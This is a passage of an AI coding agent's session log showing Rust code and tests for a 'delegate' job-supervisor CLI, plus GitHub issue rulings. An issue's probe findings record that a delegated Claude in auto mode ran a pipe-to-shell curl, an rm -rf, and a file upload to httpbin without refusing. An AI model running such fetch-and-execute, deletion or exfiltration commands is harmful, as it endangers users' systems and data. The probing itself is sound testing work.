`$TMPDIR/delegate-jobs/` is the only link between them.\n\nuse crate::backends::cursor::make_cursor_adapter;\nuse crate::capability::map_capability;\nuse crate::git::capture_head;\nuse crate::index::build_deps;\nuse crate::job_registry::{JobRegistry, RegistryDeps, WaitOpts};\nuse crate::models::resolve_model;\nuse crate::prompt::status_block;\nuse crate::runner::build_argv;\nuse crate::status_record::{CliRecordWriter, cli_record_path};\nuse crate::types::{Capability, JobSpec, ResumeContext};\nuse crate::util::{random_uuid, resolve_path};\nuse std::io::{Read, Write};\nuse std::os::unix::fs::OpenOptionsExt;\nuse std::os::unix::process::CommandExt;\nuse std::process::{Command, Stdio};\nuse std::sync::Arc;\nuse std::time::{Duration, Instant};\n\nconst USAGE: &str = \"usage: delegate run --model M [--capability read-only|read-write] [--cwd D] [--prompt-file F]\\n       delegate watch <jobId>... [--timeout S]\";\n\n/// Bad input: reason on stderr, exit 2.\nstruct Usage(String);\n\nfn usage<T>(msg: impl Into<String>) -> Result<T, Usage> {\n    Err(Usage(msg.into()))\n}\n\npub fn main() -> i32 {\n    let args: Vec<String> = std::env::args().skip(1).collect();\n    let res = match args.first().map(String::as_str) {\n        Some(\"run\") => run(&args[1..]),\n        Some(\"watch\") => watch(&args[1..]),\n        Some(\"__supervise\") => return supervise(&args[1..]),\n        _ => usage(USAGE),\n    };\n    match res {\n        Ok(code) => code,\n        Err(Usage(m)) => {\n            eprintln!(\"{m}\");\n            2\n        }\n    }\n}\n\n/// Splits `--flag value` pairs from positionals.\nfn parse(args: &[String], flags: &[&str]) -> Result<(Vec<(String, String)>, Vec<String>), Usage> {\n    let (mut kv, mut pos) = (vec![], vec![]);\n    let mut it = args.iter();\n    while let Some(a) = it.next() {\n        if a.starts_with(\"--\") {\n            if !flags.contains(&a.as_str()) {\n                return usage(format!(\"unknown flag {a}\\n{USAGE}\"));\n            }\n            let Some(v) = it.next() else {\n                return usage(format!(\"{a} needs a value\"));\n            };\n            kv.push((a.clone(), v.clone()));\n        } else {\n            pos.push(a.clone());\n        }\n    }\n    Ok((kv, pos))\n}\n\nfn flag<'a>(kv: &'a [(String, String)], name: &str) -> Option<&'a str> {\n    kv.iter().find(|(k, _)| k == name).map(|(_, v)| v.as_str())\n}\n\nfn capability(name: &str) -> Result<(Capability, &'static str), Usage> {\n    match name {\n        \"read-only\" => Ok((Capability::Ask, \"read-only\")),\n        \"read-write\" => Ok((Capability::WriteUnsandboxed, \"read-write\")),\n        o => usage(format!(\n            \"unknown capability {o}: use read-only or read-write\"\n        )),\n    }\n}\n\nfn run(args: &[String]) -> Result<i32, Usage> {\n    let (kv, _) = parse(args, &[\"--model\", \"--capability\", \"--cwd\", \"--prompt-file\"])?;\n    let Some(model) = flag(&kv, \"--model\") else {\n        return usage(\"--model is required\");\n    };\n    let cap_name = flag(&kv, \"--capability\").unwrap_or(\"read-only\");\n    capability(cap_name)?;\n    let deps = match build_deps() {\n        Ok(d) => d,\n        Err(e) => {\n            eprintln!(\"{e}\");\n            return Ok(1);\n        }\n    };\n    if resolve_model(Some(model), false, &deps.config).is_err() {\n        let mut ids: Vec<_> = deps.config.models.keys().cloned().collect();\n        ids.sort();\n        return usage(format!(\n            \"unknown model {model}; valid models: {}\",\n            ids.join(\", \")\n        ));\n    }\n    let mut prompt = String::new();\n    match flag(&kv, \"--prompt-file\") {\n        Some(f) => prompt = std::fs::read_to_string(f).map_err(|e| Usage(format!(\"{f}: {e}\")))?,\n        None => {\n            let _ = std::io::stdin().read_to_string(&mut prompt);\n        }\n    }\n    if prompt.trim().is_empty() {\n        return usage(\"prompt is empty\");\n    }\n    let cwd = match flag(&kv, \"--cwd\") {\n        Some(d) => resolve_path(d),\n        None => std::env::current_dir()\n            .map(|p| p.to_string_lossy().into_owned())\n            .map_err(|e| Usage(e.to_string()))?,\n    };\n    if !std::path::Path::new(&cwd).is_dir() {\n        return usage(format!(\"cwd {cwd} is not a directory\"));\n    }\n\n    let id = random_uuid();\n    let record = cli_record_path(&id);\n    let dir = record.parent().expect(\"record has a parent\");\n    std::fs::create_dir_all(dir).map_err(|e| Usage(format!(\"{}: {e}\", dir.display())))?;\n    let prompt_file = dir.join(format!(\"{id}.prompt\"));\n    let written = std::fs::OpenOptions::new()\n        .write(true)\n        .create_new(true)\n        .mode(0o600)\n        .open(&prompt_file)\n        .and_then(|mut f| f.write_all(prompt.as_bytes()));\n    if let Err(e) = written {\n        let _ = std::fs::remove_file(&prompt_file);\n        return usage(format!(\"{}: {e}\", prompt_file.display()));\n    }\n\n    // Own session and process group, stdio closed: the supervisor outlives this process.\n    let mut child = unsafe {\n        Command::new(std::env::current_exe().map_err(|e| Usage(e.to_string()))?)\n            .args([\"__supervise\", &id, model, cap_name, &cwd])\n            .stdin(Stdio::null())\n            .stdout(Stdio::null())\n            .stderr(Stdio::null())\n            .pre_exec(|| {\n                libc::setsid();\n                Ok(())\n            })\n            .spawn()\n    }\n    .map_err(|e| {\n        let _ = std::fs::remove_file(&prompt_file);\n        Usage(format!(\"cannot start supervisor: {e}\"))\n    })?;\n    // The supervisor writes the first RUNNING record before the agent starts; wait for it.\n    let t = Instant::now();\n    while !record.exists() {\n        if child.try_wait().ok().flatten().is_some() || t.elapsed() > Duration::from_secs(10) {\n            let _ = std::fs::remove_file(&prompt_file);\n            eprintln!(\"supervisor failed to write {}\", record.display());\n            return Ok(1);\n        }\n        std::thread::sleep(Duration::from_millis(10));\n    }\n    println!(\"{id}\");\n    Ok(0)\n}\n\n/// The detached half of `run`: drives one job, keeping its record fresh until it ends.\nfn supervise(args: &[String]) -> i32 {\n    let [id, model, cap_name, cwd] = args else {\n        return 2;\n    };\n    let fail = |m: String| {\n        eprintln!(\"{m}\");\n        1\n    };\n    let (cap, cap_label) = match capability(cap_name) {\n        Ok(c) => c,\n        Err(Usage(m)) => return fail(m),\n    };\n    let deps = match build_deps() {\n        Ok(d) => d,\n        Err(e) => return fail(e.to_string()),\n    };\n    let config = deps.config;\n    let prompt_file = cli_record_path(id).with_extension(\"prompt\");\n    let Ok(prompt) = std::fs::read_to_string(&prompt_file) else {\n        return fail(format!(\"cannot read {}\", prompt_file.display()));\n    };\n    let _ = std::fs::remove_file(&prompt_file);\n    let prompt = format!(\"{prompt}\\n\\n---\\n\\n{}\", status_block()).replace('\\0', \"\");\n\n    let capres = map_capability(cap, true);\n    let argv = build_argv(model, &capres.flags, &[], None, &prompt);\n    let spec = JobSpec {\n        bin: crate::cursor_bin::resolve_cursor_bin(None),\n        argv,\n---E2E---\n//! Drives the real `delegate` binary as a process against a fake cursor-agent.\n\nuse serde_json::Value;\nuse std::io::Write;\nuse std::os::unix::fs::PermissionsExt;\nuse std::path::{Path, PathBuf};\nuse std::process::{Command, Output, Stdio};\nuse std::time::{Duration, Instant};\n\nconst FAKE_AGENT: &str = r#\"#!/bin/sh\nprintf '%s\\n' \"$@\" > \"$(dirname \"$0\")/argv.txt\"\nprintf '%s\\n' '{\"type\":\"tool_call\",\"subtype\":\"started\",\"tool_call\":{\"shellToolCall\":{\"args\":{\"command\":\"ls\"}}}}'\ncase \"$*\" in\n  *SLOW*) i=0; while [ ! -e \"$(dirname \"$0\")/go\" ] && [ $i -lt 200 ]; do sleep 0.05; i=$((i+1)); done ;;\nesac\ncase \"$*\" in\n  *ASKME*) printf '%s\\n' '{\"type\":\"result\",\"subtype\":\"success\",\"is_error\":false,\"result\":\"Which db?\\nSTATUS: NEEDS_CONTEXT\",\"session_id\":\"s-2\"}' ;;\n  *) printf '%s\\n' '{\"type\":\"result\",\"subtype\":\"success\",\"is_error\":false,\"result\":\"391\\nSTATUS: DONE\",\"session_id\":\"s-1\"}' ;;\nesac\n\"#;\n\nstruct Env {\n    dir: PathBuf,\n}\n\nimpl Env {\n    fn new(name: &str) -> Self {\n        let dir = std::env::temp_dir().join(format!(\"cdm-cli-{name}-{}\", std::process::id()));\n        let _ = std::fs::remove_dir_all(&dir);\n        std::fs::create_dir_all(&dir).unwrap();\n        let agent = dir.join(\"agent.sh\");\n        std::fs::write(&agent, FAKE_AGENT).unwrap();\n        std::fs::set_permissions(&agent, std::fs::Permissions::from_mode(0o755)).unwrap();\n        Env { dir }\n    }\n\n    /// Lets SLOW jobs finish; until then they stay RUNNING (10s cap).\n    fn release(&self) {\n        std::fs::write(self.dir.join(\"go\"), \"\").unwrap();\n    }\n\n    fn argv(&self) -> Vec<String> {\n        let s = std::fs::read_to_string(self.dir.join(\"argv.txt\")).unwrap();\n        s.lines().map(String::from).collect()\n    }\n\n    fn delegate(&self, args: &[&str], stdin: Option<&str>) -> Output {\n        let mut child = Command::new(env!(\"CARGO_BIN_EXE_delegate\"))\n            .args(args)\n            .current_dir(&self.dir)\n            .env(\"TMPDIR\", &self.dir)\n            .env(\"CURSOR_AGENT_BIN\", self.dir.join(\"agent.sh\"))\n            .env(\"DELEGATE_HEARTBEAT_MS\", \"100\")\n            .stdin(Stdio::piped())\n            .stdout(Stdio::piped())\n            .stderr(Stdio::piped())\n            .spawn()\n            .unwrap();\n        let mut si = child.stdin.take().unwrap();\n        if let Some(s) = stdin {\n            si.write_all(s.as_bytes()).unwrap();\n        }\n        drop(si);\n        child.wait_with_output().unwrap()\n    }\n\n    /// Starts a job and returns its id.\n    fn run(&self, prompt: &str) -> String {\n        let out = self.delegate(&[\"run\", \"--model\", \"composer-2.5\"], Some(prompt));\n        assert!(\n            out.status.success(),\n            \"{}\",\n            String::from_utf8_lossy(&out.stderr)\n        );\n        String::from_utf8(out.stdout).unwrap().trim().to_string()\n    }\n\n    fn record(&self, id: &str) -> Value {\n        let p: PathBuf = self.dir.join(\"delegate-jobs\").join(format!(\"{id}.json\"));\n        serde_json::from_str(&std::fs::read_to_string(p).unwrap()).unwrap()\n    }\n\n    fn wait_terminal(&self, id: &str) -> Value {\n        let out = self.delegate(&[\"watch\", id, \"--timeout\", \"10\"], None);\n        assert_eq!(out.status.code(), Some(0));\n        serde_json::from_slice(&out.stdout).unwrap()\n    }\n}\n\nimpl Drop for Env {\n    fn drop(&mut self) {\n        let _ = std::fs::remove_dir_all(&self.dir);\n    }\n}\n\nfn alive(pid: i64) -> bool {\n    unsafe { libc::kill(pid as i32, 0) == 0 }\n}\n\nfn until(what: &str, mut f: impl FnMut() -> bool) {\n    let t = Instant::now();\n    while !f() {\n        assert!(t.elapsed() < Duration::from_secs(10), \"timed out: {what}\");\n        std::thread::sleep(Duration::from_millis(20));\n    }\n}\n\n#[test]\nfn run_returns_id_while_job_runs_then_it_finishes() {\n    let e = Env::new(\"run\");\n    let id = e.run(\"SLOW do it\");\n    assert_eq!(id.len(), 36);\n    let r = e.record(&id);\n    assert_eq!(r[\"status\"], \"RUNNING\");\n    assert_eq!(r[\"resume\"][\"model\"], \"composer-2.5\");\n    assert_eq!(r[\"resume\"][\"capability\"], \"read-only\");\n    assert_eq!(r[\"resume\"][\"sessionId\"], Value::Null);\n    let pid = r[\"supervisorPid\"].as_i64().unwrap();\n    assert!(alive(pid), \"supervisor must outlive `run`\");\n    e.release();\n\n    let done = e.wait_terminal(&id);\n    let argv = e.argv();\n    assert!(argv.windows(2).any(|w| w == [\"--mode\", \"ask\"]), \"{argv:?}\");\n    assert!(argv.contains(&\"--force\".to_string()), \"{argv:?}\");\n    assert_eq!(done[\"status\"], \"DONE\");\n    assert_eq!(done[\"result\"][\"text\"], \"391\\nSTATUS: DONE\");\n    assert_eq!(done[\"result\"][\"jobId\"], id.as_str());\n    assert_eq!(done[\"resume\"][\"sessionId\"], \"s-1\");\n    until(\"supervisor exit\", || !alive(pid));\n}\n\n#[test]\nfn running_record_heartbeat_advances() {\n    let e = Env::new(\"hb\");\n    let id = e.run(\"SLOW\");\n    let a = e.record(&id)[\"lastHeartbeatAt\"].as_f64().unwrap();\n    until(\"heartbeat\", || {\n        let r = e.record(&id);\n        r[\"status\"] != \"RUNNING\" || r[\"lastHeartbeatAt\"].as_f64().unwrap() > a\n    });\n    assert_ne!(\n        e.record(&id)[\"status\"],\n        \"DONE\",\n        \"heartbeat must advance while RUNNING\"\n    );\n    e.release();\n    e.wait_terminal(&id);\n}\n\n","localExecutionTimeMs":261},"isBackground":false},"description":"Show cli.rs and cli_e2e.rs from origin/main"},"hookAdditionalContexts":[],"toolCallId":"tool_38d6db7b-9648-45fa-8fea-ad5b5049dda","startedAtMs":"1790845569263","completedAtMs":"1790845570238"},"model_call_id":"13e7813c-8061-40d0-a475-19ebe85b4952-0-mjpw","session_id":"7dd612d0-6469-4d8d-870b-f50c14f3831a","timestamp_ms":1790845570213}
{"type":"tool_call","subtype":"completed","call_id":"tool_f4f491ce-bd7b-44f1-93c1-bf7941cf22a","tool_call":{"shellToolCall":{"args":{"command":"cd /Users/user/work/delegate-fixtures && gh issue view 15 --comments 2>/dev/null; echo \"---\"; gh issue view 4 --comments 2>/dev/null","workingDirectory":"","timeout":30000,"toolCallId":"tool_f4f491ce-bd7b-44f1-93c1-bf7941cf22a","simpleCommands":["cd","gh","echo","gh"],"hasInputRedirect":false,"hasOutputRedirect":true,"parsingResult":{"parsingFailed":false,"executableCommands":[{"name":"cd","args":[{"type":"word","value":"/Users/user/work/delegate-fixtures"}],"fullText":"cd /Users/user/work/delegate-fixtures"},{"name":"gh","args":[{"type":"word","value":"issue"},{"type":"word","value":"view"},{"type":"number","value":"15"},{"type":"word","value":"--comments"}],"fullText":"gh issue view 15 --comments"},{"name":"echo","args":[{"type":"string","value":"\"---\""}],"fullText":"echo \"---\""},{"name":"gh","args":[{"type":"word","value":"issue"},{"type":"word","value":"view"},{"type":"number","value":"4"},{"type":"word","value":"--comments"}],"fullText":"gh issue view 4 --comments"}],"hasRedirects":true,"hasCommandSubstitution":false,"allRedirectsAreDevNull":true,"redirects":[{"operator":">","destinationFds":[2],"targetNodeType":"word","targetText":"/dev/null"},{"operator":">","destinationFds":[2],"targetNodeType":"word","targetText":"/dev/null"}]},"fileOutputThresholdBytes":"40000","isBackground":false,"skipApproval":false,"timeoutBehavior":"TIMEOUT_BEHAVIOR_BACKGROUND","hardTimeout":86400000,"description":"View GitHub issues #15 and #4 with comments","closeStdin":true,"conversationId":"7dd612d0-6469-4d8d-870b-f50c14f3831a","adminCommandDenylist":[],"requestId":"13e7813c-8061-40d0-a475-19ebe85b4952"},"result":{"success":{"command":"cd /Users/user/work/delegate-fixtures && gh issue view 15 --comments 2>/dev/null; echo \"---\"; gh issue view 4 --comments 2>/dev/null","workingDirectory":"","exitCode":0,"signal":"","stdout":"---\nauthor:\tuser\nassociation:\towner\nedited:\ttrue\nstatus:\tnone\n--\n## Probe findings from #6 (2026-10-01)\n\nPR: #18. Fixtures: `tests/fixtures/{cursor,pi,claude}/*.stdout` recorded with `scripts/record.sh` (cursor-agent 2026.09.28, pi 0.99.2, claude 2.1.286; models composer-2.5, openai-codex/gpt-6-luna, claude-sonnet-5-5). Each fixture has `.argv` and `.stderr` beside it.\n\n### Does headless Claude in plan mode answer, or propose a plan?\n\nIt depends on the prompt.\n\n- A question or a review gets a direct answer. `claude/plan-plain-answer` returns `391`. `claude/plan-review` runs a read-only `Bash cat` and returns its findings. Both end `STATUS: DONE`.\n- An edit request gets no edit. `claude/plan-edit-request` reads the files, writes a plan to `~/.claude/plans/*.md` (outside cwd), and ends: \"Turn plan mode off, or tell me to proceed, and I'll do it. STATUS: NEEDS_CONTEXT\". The tree was unchanged.\n- `permission_denials` is `[]` in every run. No ExitPlanMode call appears in the stream.\n\n**Decision for #17: keep `--permission-mode plan` for read-only Claude. No fallback.** It answers read-only work and refuses edits by ending NEEDS_CONTEXT, which resume handles (`--capability read-write`). A `--disallowedTools Edit,Write,…` fallback would block plan-file writes but not Bash, so it is weaker. Not tested: whether plan mode blocks a writing Bash command.\n\n### How often does auto mode refuse, and what does a refusal look like?\n\n0 refusals in 3 probes, with `permissionMode: \"auto\"` confirmed in each `system/init` event:\n\n- `claude/auto-refusal`: `curl -s https://example.com | sh` ran (it failed on HTML). For `rm -rf ~/Downloads/old-builds`, the model checked with `ls` first; the directory was absent.\n- `claude/auto-refusal-exfil`: `curl -X POST --data-binary @calc.py https://httpbin.org/post` ran and the POST succeeded.\n\nNo refusal was captured, so its stream shape is still unknown. The likely shape is a `tool_result` with `is_error: true` plus an entry in the result line's `permission_denials`. The parser should surface `permission_denials` when it is non-empty.\n\nA delegated Claude also loads the user's global instructions. In `claude/auto-fix` it committed the fix on a new branch (`fix-add-operator`) and left the tree clean. The change-set must count commits, not only dirty files.\n\n### Does `--session-id` create the session, and does a second run continue it?\n\nYes, for both pi and Claude.\n\n- **pi:** a first use prints `Warning: No project session found with id '<id>'; creating a new session with that id.` on stderr and exits 0. The second run with the same id (`pi/resume-answer`) prints no warning, and the model answers `392` (previous answer + 1). The `session` header line carries the id.\n- **claude:** `--session-id <uuid>` on the first run, then `--resume <uuid>` (`claude/resume-answer`) answers `392`. The result line keeps the same `session_id`. Untested: reusing `--session-id` on an existing session; the spec uses `--resume`.\n- **cursor:** `--resume <session_id from the result line>` (`cursor/resume-answer`) answers `392`.\n\n### Errors\n\n- **cursor** (`cursor/error-bad-model`): exits 1 with empty stdout. stderr holds the message and the list of valid models.\n- **pi** (`pi/error-bad-model`): **exits 0**. stderr warns `Model \"no-such-model\" not found … Using custom model id.` The stream ends normally with `agent_end`, whose last message has `stopReason: \"error\"` and `errorMessage: \"Codex error: The 'no-such-model' model is not supported …\"`. The parser must read `stopReason`, not the exit code.\n- **claude** (`claude/error-bad-model`): exits 1. stdout has a `result` line with `subtype: \"success\"`, `is_error: true` and the message in `result`. stderr has `[claude-code:unrecognized_model]`. The parser must read `is_error`, not `subtype`.\n\n### Cancelled (SIGTERM to the CLI)\n\nAll three backends exit 143 and stop mid-stream (`*/cancelled`). No `result` or `agent_end` line is written. The supervisor marks CANCELLED itself; nothing in the stream says so.\n\n### NEEDS_CONTEXT\n\nAll three backends end with a question and `STATUS: NEEDS_CONTEXT` in the final text (`*/needs-context`). In a first attempt, cursor searched widely before asking (its own transcript store, `env`, a filesystem glob), which produced a 960KB stream that held the user's MCP tool descriptors. The committed fixture was re-recorded with \"do not search, ask me\".\n\n### Redaction\n\nRaw streams carry the recording user's setup: pi's system-prompt `sections` and extension `toolsAdded`, and Claude's `system/init` lists and `hook_response` output. `scripts/redact.jq` blanks these and keeps the event shapes. `record.sh` applies it and replaces the home-directory name. Any live test that records fixtures (#17 and the per-backend live tests) must use the same filter.\n\n### Cost and usage\n\n- **claude:** `total_cost_usd` on the result line.\n- **cursor:** the result line has `usage` with `inputTokens`, `outputTokens`, `cacheReadTokens` and `cacheWriteTokens`, and no cost.\n- **pi:** `usage.cost` appears on messages. The `agent_end` last-message cost (`$0.00016` in `pi/tool-calls-fix`) looks per-message. #16 should verify whether the run total needs summing over `message_end` events.\n\n### Stream noise the parsers must skip\n\n- **claude:** `system/hook_started`, `system/hook_response` (4 of them from user hooks), `system/commands_changed` and `rate_limit_event` arrive before the assistant turn.\n- **pi:** `entry_appended` and `turn_*`, and a final `agent_settled` after `agent_end`.\n- **cursor:** `thinking/delta` and `thinking/completed`.\n\n\n--\n","stderr":"","executionTime":2662,"interleavedOutput":"---\nauthor:\tuser\nassociation:\towner\nedited:\ttrue\nstatus:\tnone\n--\n## Probe findings from #6 (2026-10-01)\n\nPR: #18. Fixtures: `tests/fixtures/{cursor,pi,claude}/*.stdout` recorded with `scripts/record.sh` (cursor-agent 2026.09.28, pi 0.99.2, claude 2.1.286; models composer-2.5, openai-codex/gpt-6-luna, claude-sonnet-5-5). Each fixture has `.argv` and `.stderr` beside it.\n\n### Does headless Claude in plan mode answer, or propose a plan?\n\nIt depends on the prompt.\n\n- A question or a review gets a direct answer. `claude/plan-plain-answer` returns `391`. `claude/plan-review` runs a read-only `Bash cat` and returns its findings. Both end `STATUS: DONE`.\n- An edit request gets no edit. `claude/plan-edit-request` reads the files, writes a plan to `~/.claude/plans/*.md` (outside cwd), and ends: \"Turn plan mode off, or tell me to proceed, and I'll do it. STATUS: NEEDS_CONTEXT\". The tree was unchanged.\n- `permission_denials` is `[]` in every run. No ExitPlanMode call appears in the stream.\n\n**Decision for #17: keep `--permission-mode plan` for read-only Claude. No fallback.** It answers read-only work and refuses edits by ending NEEDS_CONTEXT, which resume handles (`--capability read-write`). A `--disallowedTools Edit,Write,…` fallback would block plan-file writes but not Bash, so it is weaker. Not tested: whether plan mode blocks a writing Bash command.\n\n### How often does auto mode refuse, and what does a refusal look like?\n\n0 refusals in 3 probes, with `permissionMode: \"auto\"` confirmed in each `system/init` event:\n\n- `claude/auto-refusal`: `curl -s https://example.com | sh` ran (it failed on HTML). For `rm -rf ~/Downloads/old-builds`, the model checked with `ls` first; the directory was absent.\n- `claude/auto-refusal-exfil`: `curl -X POST --data-binary @calc.py https://httpbin.org/post` ran and the POST succeeded.\n\nNo refusal was captured, so its stream shape is still unknown. The likely shape is a `tool_result` with `is_error: true` plus an entry in the result line's `permission_denials`. The parser should surface `permission_denials` when it is non-empty.\n\nA delegated Claude also loads the user's global instructions. In `claude/auto-fix` it committed the fix on a new branch (`fix-add-operator`) and left the tree clean. The change-set must count commits, not only dirty files.\n\n### Does `--session-id` create the session, and does a second run continue it?\n\nYes, for both pi and Claude.\n\n- **pi:** a first use prints `Warning: No project session found with id '<id>'; creating a new session with that id.` on stderr and exits 0. The second run with the same id (`pi/resume-answer`) prints no warning, and the model answers `392` (previous answer + 1). The `session` header line carries the id.\n- **claude:** `--session-id <uuid>` on the first run, then `--resume <uuid>` (`claude/resume-answer`) answers `392`. The result line keeps the same `session_id`. Untested: reusing `--session-id` on an existing session; the spec uses `--resume`.\n- **cursor:** `--resume <session_id from the result line>` (`cursor/resume-answer`) answers `392`.\n\n### Errors\n\n- **cursor** (`cursor/error-bad-model`): exits 1 with empty stdout. stderr holds the message and the list of valid models.\n- **pi** (`pi/error-bad-model`): **exits 0**. stderr warns `Model \"no-such-model\" not found … Using custom model id.` The stream ends normally with `agent_end`, whose last message has `stopReason: \"error\"` and `errorMessage: \"Codex error: The 'no-such-model' model is not supported …\"`. The parser must read `stopReason`, not the exit code.\n- **claude** (`claude/error-bad-model`): exits 1. stdout has a `result` line with `subtype: \"success\"`, `is_error: true` and the message in `result`. stderr has `[claude-code:unrecognized_model]`. The parser must read `is_error`, not `subtype`.\n\n### Cancelled (SIGTERM to the CLI)\n\nAll three backends exit 143 and stop mid-stream (`*/cancelled`). No `result` or `agent_end` line is written. The supervisor marks CANCELLED itself; nothing in the stream says so.\n\n### NEEDS_CONTEXT\n\nAll three backends end with a question and `STATUS: NEEDS_CONTEXT` in the final text (`*/needs-context`). In a first attempt, cursor searched widely before asking (its own transcript store, `env`, a filesystem glob), which produced a 960KB stream that held the user's MCP tool descriptors. The committed fixture was re-recorded with \"do not search, ask me\".\n\n### Redaction\n\nRaw streams carry the recording user's setup: pi's system-prompt `sections` and extension `toolsAdded`, and Claude's `system/init` lists and `hook_response` output. `scripts/redact.jq` blanks these and keeps the event shapes. `record.sh` applies it and replaces the home-directory name. Any live test that records fixtures (#17 and the per-backend live tests) must use the same filter.\n\n### Cost and usage\n\n- **claude:** `total_cost_usd` on the result line.\n- **cursor:** the result line has `usage` with `inputTokens`, `outputTokens`, `cacheReadTokens` and `cacheWriteTokens`, and no cost.\n- **pi:** `usage.cost` appears on messages. The `agent_end` last-message cost (`$0.00016` in `pi/tool-calls-fix`) looks per-message. #16 should verify whether the run total needs summing over `message_end` events.\n\n### Stream noise the parsers must skip\n\n- **claude:** `system/hook_started`, `system/hook_response` (4 of them from user hooks), `system/commands_changed` and `rate_limit_event` arrive before the assistant turn.\n- **pi:** `entry_appended` and `turn_*`, and a final `agent_settled` after `agent_end`.\n- **cursor:** `thinking/delta` and `thinking/completed`.\n\n\n--\n","localExecutionTimeMs":2085},"isBackground":false},"description":"View GitHub issues #15 and #4 with comments"},"hookAdditionalContexts":[],"toolCallId":"tool_f4f491ce-bd7b-44f1-93c1-bf7941cf22a","startedAtMs":"1790845569253","completedAtMs":"1790845572070"},"model_call_id":"13e7813c-8061-40d0-a475-19ebe85b4952-0-mjpw","session_id":"7dd612d0-6469-4d8d-870b-f50c14f3831a","timestamp_ms":1790845572044}
{"type":"tool_call","subtype":"completed","call_id":"tool_67c0b7a8-7cc0-4971-810f-d5d27f664fc","tool_call":{"shellToolCall":{"args":{"command":"for n in 7 9 10 11 12 13; do echo \"======== ISSUE $n ========\"; gh issue view $n --comments 2>/dev/null; done","workingDirectory":"","timeout":30000,"toolCallId":"tool_67c0b7a8-7cc0-4971-810f-d5d27f664fc","simpleCommands":["echo","gh"],"hasInputRedirect":false,"hasOutputRedirect":true,"parsingResult":{"parsingFailed":false,"executableCommands":[{"name":"echo","args":[{"type":"string","value":"\"======== ISSUE $n ========\""}],"fullText":"echo \"======== ISSUE $n ========\""},{"name":"gh","args":[{"type":"word","value":"issue"},{"type":"word","value":"view"},{"type":"simple_expansion","value":"$n"},{"type":"word","value":"--comments"}],"fullText":"gh issue view $n --comments"}],"hasRedirects":true,"hasCommandSubstitution":false,"allRedirectsAreDevNull":true,"redirects":[{"operator":">","destinationFds":[2],"targetNodeType":"word","targetText":"/dev/null"}]},"fileOutputThresholdBytes":"40000","isBackground":false,"skipApproval":false,"timeoutBehavior":"TIMEOUT_BEHAVIOR_BACKGROUND","hardTimeout":86400000,"description":"View owner rulings on issues #7-#13","closeStdin":true,"conversationId":"7dd612d0-6469-4d8d-870b-f50c14f3831a","adminCommandDenylist":[],"requestId":"13e7813c-8061-40d0-a475-19ebe85b4952"},"result":{"success":{"command":"for n in 7 9 10 11 12 13; do echo \"======== ISSUE $n ========\"; gh issue view $n --comments 2>/dev/null; done","workingDirectory":"","exitCode":0,"signal":"","stdout":"======== ISSUE 7 ========\nauthor:\tuser\nassociation:\towner\nedited:\tfalse\nstatus:\tnone\n--\n## Preflight rulings (owner, 2026-10-01)\n\n1. Real detached supervisor; the status file is the only source of truth. The MCP `job_registry` stays untouched until #13.\n2. Record path: `$TMPDIR/delegate-jobs/<uuid>.json`.\n3. Record shape: whatever is cheapest to implement and parse. That means the existing `PollResult` JSON (camelCase) plus `supervisorPid`, `heartbeatAt` and `resume {model, cwd, capability, sessionId}`.\n4. Heartbeat: 30s by default. Tests shorten it with a `DELEGATE_HEARTBEAT_MS` environment override. The supervisor is a separate process, so a fake clock cannot be shared with it.\n5. `watch`: one JSON line per job, in argument order. Exit 0 when all are terminal. On timeout, print the current records and exit 1.\n6. `watch` on an unknown job id exits 2 at once.\n7. Bad input to `run` (unknown model, empty prompt) exits 2 with the reason on stderr. An unknown model also lists the valid ids.\n8. The CLI appends only the STATUS-line instruction. The MCP prompt path is unchanged.\n9. A status-record write failure makes the supervisor exit non-zero. A supervisor that dies leaving RUNNING is deferred to #9.\n10. A second `[[bin]]` named `delegate` in `src/bin/delegate.rs`, sharing the library.\n\n--\nauthor:\tuser\nassociation:\towner\nedited:\tfalse\nstatus:\tnone\n--\nClarification on ruling 3: the heartbeat field is `lastHeartbeatAt`, reused from `PollResult`, not a new `heartbeatAt`.\n--\n======== ISSUE 9 ========\nauthor:\tuser\nassociation:\towner\nedited:\tfalse\nstatus:\tnone\n--\n## Preflight rulings (owner, 2026-10-01)\n\n1. **BUSY:** a second read-write `run` or `resume` in a locked cwd prints `BUSY <holderJobId>` on stderr and exits 3.\n2. **Gate timeout:** the gate is killed if it runs past the job's tool-idle window (`--tool-idle-ms`, default 1800s). There is no new flag.\n3. **Lock:** `flock` on `$TMPDIR/delegate-locks/<hash of canonical cwd>.lock`, held by the supervisor. The file holds the job id.\n4. **Idle defaults:** model-idle 300s and tool-idle 1800s, carried over from the host profile.\n5. **Change-set:** always lists the commits made during the run, plus a concern if the tree is still dirty. The #6 probe showed a delegated Claude commits on its own branch.\n6. **MCP:** the old MCP `cursor_run` path does not take the file lock. That gap is accepted until #13 deletes MCP.\n7. **Dead supervisor** (deferred from #7): stale-heartbeat handling belongs here.\n--\n======== ISSUE 10 ========\nauthor:\tuser\nassociation:\towner\nedited:\tfalse\nstatus:\tnone\n--\n## Preflight rulings (owner, 2026-10-01)\n\n1. **Output:** `resume` prints the new job id, like `run`.\n2. **Cancel on a terminal job:** a no-op. It prints the record and exits 0.\n3. **Resume errors:** `resume` on a RUNNING job, or on a record with no session id, exits 2 with the reason on stderr.\n4. **Chain links:** resuming A as B writes `supersededBy: B` into A's record and `resumedFrom: A` into B's. This keeps the reason MCP added the pointer (commit 8b21892): a watcher on a resumed NEEDS_CONTEXT record must be able to follow the chain instead of acting on the stale question.\n5. **Cancel:** SIGTERM to the supervisor's process group, then SIGKILL after 5s. If `cancel` had to SIGKILL, it writes CANCELLED itself.\n6. **Busy cwd:** a read-write resume into a locked cwd follows the #9 BUSY ruling (stderr `BUSY <holder>`, exit 3).\n--\n======== ISSUE 11 ========\nauthor:\tuser\nassociation:\towner\nedited:\tfalse\nstatus:\tnone\n--\n## Preflight rulings (owner, 2026-10-01)\n\n1. **`delegate models`:** an aligned text table with id, label, backend and $in/$out per 1M tokens. The default is marked `*`. Rows sort by backend, then id.\n2. **`delegate doctor`:** human-readable text on stdout, one ok/warn/fail line per check. Missing or renamed models are warnings. It exits 0 when there are only warnings, and 1 on a hard failure (binary missing, or not logged in).\n3. **pi and claude models before #16/#17 land:** `run` exits 2 with `backend not implemented`, and `doctor` prints a skip line for each.\n4. **Model table:** `backend` replaces `family`. The ids are the 13 listed in #11 and spec story 45. Grok 4.7 is priced as Grok 4.6.\n--\n======== ISSUE 12 ========\nauthor:\tuser\nassociation:\towner\nedited:\tfalse\nstatus:\tnone\n--\n## Preflight rulings: orchestrator ruling (owner asleep; reversible)\n\n1. **Slow-run negative control:** no test-only delay hook in production code. The lane records the negative control in the PR instead: it adds a local 